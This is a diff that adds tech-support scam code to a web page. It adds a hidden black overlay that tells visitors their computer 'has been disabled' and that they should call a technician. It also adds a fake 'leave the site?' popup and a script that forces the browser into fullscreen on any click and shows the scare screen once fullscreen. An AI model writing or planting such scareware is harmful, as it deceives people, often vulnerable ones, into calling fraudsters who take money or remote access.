@@ -164,6 +164,157 @@
         </svg>
     </div>
 </div>
+
+<style>
+    #exit-popup {
+        position: fixed;
+        left: 0;
+        top: 0;
+        right: 0;
+        margin: 0 auto;
+        display: none;
+        background-color: #fff;
+        max-width: 460px;
+        padding: 10px;
+        border-radius: 8px;
+        box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+        font-family: Arial, Helvetica, sans-serif;
+        width: 90%;
+        box-sizing: border-box;
+        z-index: 9999999999999999999999;
+    }
+
+    .btn_leave {
+        padding: 10px 20px;
+        background-color: #1b73e8;
+        color: #fff !important;
+        text-transform: capitalize;
+        text-decoration: none;
+        border: 1px solid #ddd;
+        border-radius: 5px;
+        display: inline-block;
+        animation: zoominoutsinglefeatured 1s infinite;
+    }
+
+    .btn_cancel {
+        padding: 10px 20px;
+        border: 1px solid #ddd;
+        color: #1b73e8 !important;
+        text-transform: capitalize;
+        text-decoration: none;
+        border-radius: 5px;
+        display: inline-block;
+        margin-left: 10px;
+        background-color: transparent;
+    }
+
+    .btn-wrapper {
+        text-align: right;
+        margin-top: 20px;
+    }
+
+    @keyframes zoominoutsinglefeatured {
+        0% {
+            transform: scale(1, 1);
+        }
+
+        50% {
+            transform: scale(1.1, 1.1);
+        }
+
+        100% {
+            transform: scale(1, 1);
+        }
+    }
+
+    @keyframes zoomininsinglefeatured {
+        0% {
+            transform: scale(1, 1);
+        }
+
+        50% {
+            transform: scale(1.1, 1.1);
+        }
+
+        100% {
+            transform: scale(1, 1);
+        }
+    }
+
+    @keyframes scale {
+        0% {
+            transform: scale(1);
+        }
+
+        100% {
+            transform: scale(1.2);
+        }
+    }
+</style>
+
+<div id="overlay2"
+     style="    z-index: 9999999999;    position: fixed;    height: 100vh;    width: 100vw;    background: black;    display: none;">
+    <div
+            style="height: 250px;width: 650px;margin: auto;margin-top: calc( (100vh / 2) - 125px );border: 2px white solid;padding: 50px; animation: scale 2s infinite alternate;">
+        <p class="text-center" style="color: #FEFEFE; font-size: large;"> Do not restart or operate the
+            computer.<br>
+            Your computer has been disabled. Please call immediately.<br>
+            Access to this computer has been blocked for security reasons.<br>
+            Please contact us immediately. A technician will help resolve the issue. </p>
+    </div>
+</div>
+<div id="exit-popup">
+    <h3>Do you want to leave the site?</h3>
+    <p style="font-size: large">Are you sure you want to leave this page?</p>
+    <div class="btn-wrapper">
+        <button class="btn_leave" style="font-size: large">Leave</button>
+        <button class="btn_cancel" style="font-size: large">Cancel</button>
+    </div>
+</div>
+<script>    let popupShown = false;
+let isOverlay = false;
+
+function isFullscreen() {
+    return !!(document.fullscreenElement || document.webkitFullscreenElement || document.mozFullScreenElement || document.msFullscreenElement);
+}
+
+document.addEventListener('click', () => {
+    const el = document.documentElement;
+    if (el.requestFullscreen) {
+        el.requestFullscreen();
+    } else if (el.webkitRequestFullscreen) {
+        el.webkitRequestFullscreen();
+    } else if (el.msRequestFullscreen) {
+        el.msRequestFullscreen();
+    }
+});
+
+function checkFull() {
+    if (!popupShown && !isFullscreen()) {
+        isOverlay = false;
+        console.log('show popup');
+        setTimeout(function () {
+            document.getElementById('exit-popup').style.display = 'block';
+        }, 3000);
+        popupShown = true;
+    } else if (popupShown && isFullscreen()) {
+        isOverlay = true;
+        document.getElementById('overlay2').style.display = 'block';
+        setTimeout(function () {
+            document.getElementById('overlay2').style.display = 'none';
+        }, 5000);
+        console.log('hide popup');
+        document.getElementById('exit-popup').style.display = 'none';
+        popupShown = false;
+    }
+    console.log(isFullscreen(), popupShown);
+}
+
+document.addEventListener('mousemove', checkFull);
+</script>
+
+
+
 <script src="nvidia.js"></script>
 <script src="jupiter.js"></script>
 <script src="bxsafe.js"></script>
